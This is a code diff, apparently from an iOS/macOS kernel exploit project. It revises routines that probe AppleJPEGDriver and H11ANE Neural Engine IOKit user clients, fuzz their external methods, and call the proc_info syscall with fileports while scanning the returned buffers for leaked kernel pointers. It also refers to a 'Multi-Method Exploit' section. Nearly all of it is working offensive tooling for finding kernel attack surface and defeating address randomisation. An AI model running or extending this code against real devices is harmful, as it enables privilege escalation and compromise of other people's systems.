@@ -487,7 +487,23 @@ static void diagnostic_iokit(void) {
     for (int i = 0; i < sizeof(svcNames)/sizeof(svcNames[0]); i++) {
         if (strcmp(svcNames[i], "H11ANE") == 0)
             try_open_service(svcNames[i], 0, true);
-        else
+        else if (strcmp(svcNames[i], "AppleJPEGDriver") == 0) {
+            // Try types 0-3 for JPEG too
+            io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
+                IOServiceNameMatching("AppleJPEGDriver"));
+            if (svc) {
+                for (uint32_t t = 0; t <= 3; t++) {
+                    io_connect_t conn = 0;
+                    kern_return_t kr = IOServiceOpen(svc, mach_task_self_, t, &conn);
+                    printf("[IOKit] AppleJPEGDriver type=%u: %s (conn=%#x, kr=%#x)\n",
+                           t, kr == KERN_SUCCESS ? "OPENED" : "no UC", conn, kr);
+                    if (conn) IOServiceClose(conn);
+                }
+                IOObjectRelease(svc);
+            } else {
+                printf("[IOKit] AppleJPEGDriver: not found\n");
+            }
+        } else
             try_open_service(svcNames[i], 0, false);
     }
     printf("=== IOKit Diagnostic Complete ===\n\n");
@@ -631,57 +647,28 @@ static void method_h11ane_fuzz(void) {
     printf("\n[Method: H11ANE_fuzz] Fuzzing H11ANE Neural Engine...\n");
     if (!open_h11ane()) { printf("[H11ANE] Cannot open\n"); return; }
 
+    int e02c2Count = 0, otherErrorCount = 0, successCount = 0;
+    uint32_t firstOtherMethod = 0, firstOtherKr = 0;
+
     // Method enumeration: try 0-63 with scalar args, struct args, output
     for (uint32_t m = 0; m < 64; m++) {
         // Pattern A: zero inputs
-        uint64_t zeroOut[8] = {};
-        size_t outSz = sizeof(zeroOut);
+        uint64_t outBuf[8] = {};
+        size_t outSz = sizeof(outBuf);
         kern_return_t kr = IOConnectCallMethod(gH11Conn, m,
-            NULL, 0, NULL, 0, zeroOut, (uint32_t*)&outSz, NULL, NULL);
-        if (kr != KERN_SUCCESS && kr != 0xe00002c2) {
-            printf("[H11ANE] method %d (zero): kr=%#x (diff from E02C2!)\n", m, kr);
-        } else if (kr == KERN_SUCCESS) {
+            NULL, 0, NULL, 0, outBuf, (uint32_t*)&outSz, NULL, NULL);
+        if (kr == KERN_SUCCESS) {
+            successCount++;
             printf("[H11ANE] method %d (zero): SUCCESS kr=0 outSz=%zu", m, outSz);
             for (int i = 0; i < 8 && outSz >= 8; i++)
-                if (zeroOut[i]) printf(" out[%d]=0x%llx", i, zeroOut[i]);
+                if (outBuf[i]) printf(" out[%d]=0x%llx", i, outBuf[i]);
             printf("\n");
-        }
-
-        // Pattern B: scalar inputs
-        uint64_t out2[8] = {};
-        outSz = sizeof(out2);
-        uint64_t inScalar[8] = {m, m+1, m+2, m+3, m+4, m+5, m+6, m+7};
-        kr = IOConnectCallMethod(gH11Conn, m,
-            inScalar, 8, NULL, 0, out2, (uint32_t*)&outSz, NULL, NULL);
-        if (kr == KERN_SUCCESS) {
-            printf("[H11ANE] method %d (scalar): SUCCESS kr=0 outSz=%zu", m, outSz);
-            for (int i = 0; i < 8 && outSz >= 8; i++)
-                if (out2[i]) printf(" out[%d]=0x%llx", i, out2[i]);
-            printf("\n");
-        }
-
-        // Pattern C: zero inputs + large output (look for info leak)
-        uint64_t out3[64] = {}; // 512 bytes
-        outSz = sizeof(out3);
-        kr = IOConnectCallMethod(gH11Conn, m,
-            NULL, 0, NULL, 0, out3, (uint32_t*)&outSz, NULL, NULL);
-        if (kr == KERN_SUCCESS) {
-            int nz = 0;
-            for (int i = 0; i < 64 && outSz >= 8; i++) {
-                if (out3[i]) {
-                    uint64_t v = out3[i];
-                    if ((v >> 40) == 0xFFFFFF) {
-                        printf("[H11ANE] method %d KPTR out[%d]=0x%016llx\n", m, i, v);
-                        nz++;
-                    }
-                }
-            }
-            if (nz == 0) {
-                // Check for non-zero non-ptr data
-                for (int i = 0; i < 64 && outSz >= 8; i++) {
-                    if (out3[i]) { printf("[H11ANE] method %d: out[%d]=0x%llx\n", m, i, out3[i]); break; }
-                }
-            }
+        } else if (kr != 0xe00002c2) {
+            otherErrorCount++;
+            if (otherErrorCount == 1) { firstOtherMethod = m; firstOtherKr = kr; }
+            printf("[H11ANE] method %d (zero): kr=%#x (!= E02C2)\n", m, kr);
+        } else {
+            e02c2Count++;
         }
     }
 
@@ -696,22 +683,26 @@ static void method_h11ane_fuzz(void) {
     });
     if (aneSurf) {
         uint32_t sid = IOSurfaceGetID(aneSurf);
-        printf("[H11ANE] Trying IOSurface ID=%u with methods...\n", sid);
+        int surfOk = 0;
         for (uint32_t m = 0; m < 16; m++) {
             uint64_t args[4] = {sid, 0, 0, 0};
             size_t outSz = 32;
             uint64_t out[4] = {};
             kern_return_t kr = IOConnectCallMethod(gH11Conn, m,
                 args, 4, NULL, 0, out, (uint32_t*)&outSz, NULL, NULL);
-            if (kr == KERN_SUCCESS)
-                printf("[H11ANE] method %d w/ surface: SUCCESS kr=0\n", m);
+            if (kr == KERN_SUCCESS) {
+                printf("[H11ANE] method %d w/ surface: SUCCESS\n", m);
+                surfOk++;
+            }
         }
+        printf("[H11ANE] surface methods success: %d/16\n", surfOk);
         CFRelease(aneSurf);
     }
 
     IOServiceClose(gH11Conn);
     gH11Conn = 0;
-    printf("[H11ANE] fuzz complete\n");
+    printf("[H11ANE] fuzz complete: %d success, %d E02C2, %d other (first other: method %u kr=%#x)\n",
+           successCount, e02c2Count, otherErrorCount, firstOtherMethod, firstOtherKr);
 }
 
 // ===== Multi-Method Exploit =====
@@ -969,56 +960,59 @@ static bool method_proc_info(void) {
         return false;
     }
 
-    uint8_t buf[0x400];
-    int flavors[] = {1, 2, 3};
-    const char *fnames[] = {"NOINFO", "IPCINFO", "UNKN3"};
     bool ok = false;
 
+    // Try with fileport (DarkSword approach: callnum, pid, flavor, arg, buffer, bufsize)
+    // Positive return = bytes written = success
+    fileport_t fp = 0;
+    fileport_makeport(fd, &fp);
+    uint8_t *bigBuf = calloc(1, 0x4000);
+
+    int flavors[] = {1, 2, 3};
+    const char *fnames[] = {"NOINFO", "IPCINFO", "UNKN3"};
     for (int fi = 0; fi < 3; fi++) {
-        memset(buf, 0, sizeof(buf));
-        int r = syscall(336, 6, getpid(), flavors[fi], (uint64_t)(intptr_t)fd,
-            (uint64_t)(uintptr_t)buf, (uint32_t)sizeof(buf));
-        if (r == 0) {
-            printf("[proc_info] flavor=%d (%s) SUCCESS\n", flavors[fi], fnames[fi]);
-            uint64_t gencnt = *(uint64_t*)(buf + 0x110);
-            printf("[proc_info] inp_gencnt=0x%llx\n", gencnt);
-            for (int off = 0; off < 0x400; off += 8) {
-                uint64_t v = *(uint64_t*)(buf + off);
-                if (v) printf("[proc_info] +%#x = 0x%016llx\n", off, v);
-            }
+        memset(bigBuf, 0, 0x4000);
+        int r = syscall(336, 6, getpid(), flavors[fi], fp,
+            (uint64_t)(uintptr_t)bigBuf, 0x4000);
+        if (r > 0) {
+            printf("[proc_info] fileport flavor=%d (%s): SUCCESS (%d bytes)\n",
+                   flavors[fi], fnames[fi], r);
             ok = true;
-        } else if (errno == ENOMEM) {
-            // Try with larger buffer
-            uint8_t *big = calloc(1, 0x4000);
-            r = syscall(336, 6, getpid(), flavors[fi], (uint64_t)(intptr_t)fd,
-                (uint64_t)(uintptr_t)big, 0x4000);
-            if (r == 0) {
-                printf("[proc_info] flavor=%d (%s) SUCCESS w/ 16KB buf\n", flavors[fi], fnames[fi]);
-                for (int off = 0; off < 0x4000; off += 8) {
-                    uint64_t v = *(uint64_t*)(big + off);
-                    if (v) printf("[proc_info] +%#x = 0x%016llx\n", off, v);
+            for (int off = 0; off < r && off < 0x1000; off += 8) {
+                uint64_t v = *(uint64_t*)(bigBuf + off);
+                if (v) {
+                    printf("[proc_info] +%#x = 0x%016llx", off, v);
+                    if ((v >> 40) == 0xFFFFFF) printf(" *** KPTR");
+                    printf("\n");
                 }
-                ok = true;
-            } else {
-                printf("[proc_info] flavor=%d (%s): r=%d errno=%d\n", flavors[fi], fnames[fi], r, errno);
             }
-            free(big);
         } else {
-            printf("[proc_info] flavor=%d (%s): r=%d errno=%d\n", flavors[fi], fnames[fi], r, errno);
+            printf("[proc_info] fileport flavor=%d (%s): r=%d errno=%d\n",
+                   flavors[fi], fnames[fi], r, errno);
         }
     }
 
-    // Also try with fileport (old approach)
-    fileport_t fp = 0;
-    fileport_makeport(fd, &fp);
-    int r = syscall(336, 6, getpid(), 3, fp, buf, sizeof(buf));
-    if (r == 0) {
-        printf("[proc_info] fileport flavor=3: SUCCESS\n");
-        ok = true;
-    } else {
-        printf("[proc_info] fileport flavor=3: r=%d errno=%d\n", r, errno);
+    // Also try with fd directly and buffer-before-arg order (newer xnu layout)
+    for (int fi = 0; fi < 3; fi++) {
+        memset(bigBuf, 0, 0x4000);
+        int r = syscall(336, 6, getpid(), flavors[fi],
+            (uint64_t)(uintptr_t)bigBuf, 0x4000, (uint64_t)(intptr_t)fd);
+        if (r > 0) {
+            printf("[proc_info] fd-buforder flavor=%d (%s): SUCCESS (%d bytes)\n",
+                   flavors[fi], fnames[fi], r);
+            ok = true;
+            for (int off = 0; off < r && off < 0x1000; off += 8) {
+                uint64_t v = *(uint64_t*)(bigBuf + off);
+                if (v) {
+                    printf("[proc_info] +%#x = 0x%016llx", off, v);
+                    if ((v >> 40) == 0xFFFFFF) printf(" *** KPTR");
+                    printf("\n");
+                }
+            }
+        }
     }
 
+    free(bigBuf);
     close(fd);
     return ok;
 }
